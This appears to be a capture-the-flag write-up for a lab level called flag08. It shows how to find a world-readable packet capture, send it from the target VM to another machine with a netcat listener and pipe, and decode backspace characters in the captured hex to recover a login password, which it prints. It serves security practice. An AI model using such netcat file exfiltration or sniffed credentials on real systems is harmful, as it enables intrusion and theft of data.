World readable files strike again. Check what that user was up to, and use it to log into flag08 account.

In /home/flag08 we can see a .pcap file. We can preview the packet file using tcpdump, but collecting data this way is pretty hard. 
We can copy the file from vm to local machine using netcat. First set netcat to listen on local machine using:
> nc -l 20000 > out.pcap
This way all data received is redirected to the file. Then on vm we have to connect and send original capture.pcap. 
> cat capture.pcap | nc 192.168.x.x 20000

Now we can start wireshark and inspect data from packets in a more user friendly way.
After inspecting data in hex we can see:
62 61 63 6b 64 6f 6f 72 7f 7f 7f 30 30 52 6d 38 7f 61 74 65 0d
In ASCII:
backdoor...00Rm8.ate

After looking up in ASCII table 7f we know it's hex for DEL, which is backspace.
Finally, recovered password is:
backd00Rmate

Now try logging to vm using login flag08 and password backd00Rmate. Success!
